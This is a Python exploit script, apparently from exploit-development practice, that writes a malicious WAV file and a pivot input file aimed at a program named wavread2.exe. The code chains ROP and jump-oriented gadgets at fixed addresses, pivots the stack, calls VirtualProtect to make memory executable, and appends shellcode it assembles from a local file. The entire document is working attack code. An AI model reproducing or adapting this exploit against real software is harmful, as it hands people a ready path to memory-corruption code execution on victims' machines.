import os
import sys
import struct

import subprocess

def create_rop_chain():
	rop_gadgets = [
		0x0042511e, # (base + 0x2511e), # pop edx # ret  # wavread2.exe   Load EDX with address for dispatcher gadget!
		0x00401677, # (base + 0x1677) # add ebx, 0x10 # jmp dword ptr [ebx] # wavread2.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 12 bytes between dispatch table slots!
		0x00426de6, # (base + 0x26de6), # pop ebx # ret  # wavread2.exe Load EBX with address of dispatch table
		0x00426de6, # (base + 0x26de6), # pop ebx # ret  # wavread2.exe Load EBX with address of dispatch table
		0x00426de6, # (base + 0x26de6), # pop ebx # ret  # wavread2.exe Load EBX with address of dispatch table
		0x5D43232A, # 0x00436060, Address for your dispatcher table!
    0x004158e9, # MOV EAX,5D00434A # RETN    ** [wavread2.exe] **   |  startnull {PAGE_EXECUTE_READ}
    0x00401705, # XOR EBX,EAX # RETN    ** [wavread2.exe] **   |  startnull,ascii {PAGE_EXECUTE_READ}
    0x0040167a, # (base + 0x167a), # jmp dword ptr [ebx] # wavread2.exe # JMP to dispatcher gadget; start the JOP!
	]
	return b''.join(struct.pack('<I', _) for _ in rop_gadgets)

def create_jop_chain():
	jop_gadgets = [
		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
		0x004016dd, # (base + 0x16dd), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x18
		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
		0x004016dd, # (base + 0x16dd), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
		0x004016dd, # (base + 0x16dd), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x48
		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
		0x004016dd, # (base + 0x16dd), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
		0x004016ba, # (base + 0x16ba), # add esp, 0x10 # jmp edx # wavread2.exe  [0x10 bytes] 0x70
		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
		0x004016ba, # (base + 0x16ba), # add esp, 0x10 # jmp edx # wavread2.exe  [0x10 bytes] 0x80 **^ 
		# N----> STACK PIVOT TOTAL: 0x80 bytes
		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
		0x00401546, # (base + 0x1546), # pop eax # jmp edx # wavread2.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
		0x0041d6ca, # (base + 0x1d6ca), # jmp dword ptr [eax] # wavread2.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return b''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x00427008) # ptr -> VirtualProtect()
vp_stack += struct.pack('<L', 0x004360F0) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00436000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00433000) # lpflOldProtect <--  MUST be writable location

##################### FILL MANDATORY FILE FIELDS ###########################

format = b"RIFF" # ChunkID, identify the samples audio data in hi/lo format
format += bytes(struct.pack('<L', 0x01cc45d4)) # ChunkSize: 01CC45D4=30,164,452 is the total size minus 8
format += b"WAVE" # ChunkFormat, this format requires two subchunks to exist, "fmt " and "data"
format += b"fmt "  # Subchunk1, this describes the format of the next DATA subchunk.

##################### BEGIN CREATION OF STACK PIVOT #####################

format += bytes(struct.pack('<L', 0x00412c24))  # POP EAX # POP EBP # RETN    ** [wavread.exe] SafeSEH **   |  startnull,asciiprint,ascii {PAGE_EXECUTE_READ}
format += bytes(struct.pack('<L', 0x00436030))  # address of shellcode + offset, DAT_00436000 + 0x30
format += bytes(struct.pack('<L', 0x43434343))  # dummy value for the POP EBP
format += bytes(struct.pack('<L', 0x0041fc22))  # XCHG EAX,ESP # RETN    ** [wavread.exe] **   |  startnull {PAGE_EXECUTE_READ}
format += bytes(struct.pack('<L', 0x00000010))  # required file format field

##################### MORE MANDATORY FILE FIELDS #####################

format += b"data" # Subchunk2, this chunk would contain the audio samples
format += bytes(struct.pack('<L', 0x01cc45b0)) # ChunkSize: 01CC45D4=30,164,452 is the total size minus 8

##################### NOP SLED + SHELLCODE OFFSET #####################

nops = b"\x90" * 12
nops = bytes(struct.pack('<L', 0x00436090))

#####################   COMPILE SHELLCODE   ###########################

cmd = '"C:\\Program Files\\NASM\\nasm.exe" "'+os.getcwd()+'\\micah.asm"'
status = subprocess.call(cmd, shell=True)

##################### CONVERT SHELLCODE TO BYTES ######################

bin = "micah"
shellcode = b""

with open(bin, 'rb') as f:
    shellcode = f.read()

shellcode = b"\x90\xBC\xEC\xCD\x18\x00" + shellcode # NOP pad + stack offset

##################### OUTPUT EXPLOIT AS .WAV #####################

padding = b'\x41' * 4

payload = format + padding + rop_chain + jop_chain + vp_stack + nops + shellcode

binary_file = open("exploit.wav", "wb")
binary_file.write(payload)
binary_file.close()

##################### COMMAND PIVOT TO FILE #####################

command = b"\x42" * 408
command += bytes(struct.pack('<L', 0x0042661e)) # clear stack of +16, reach exploit.wav
command_file = open("command.txt", "wb")
command_file.write(command)
command_file.close()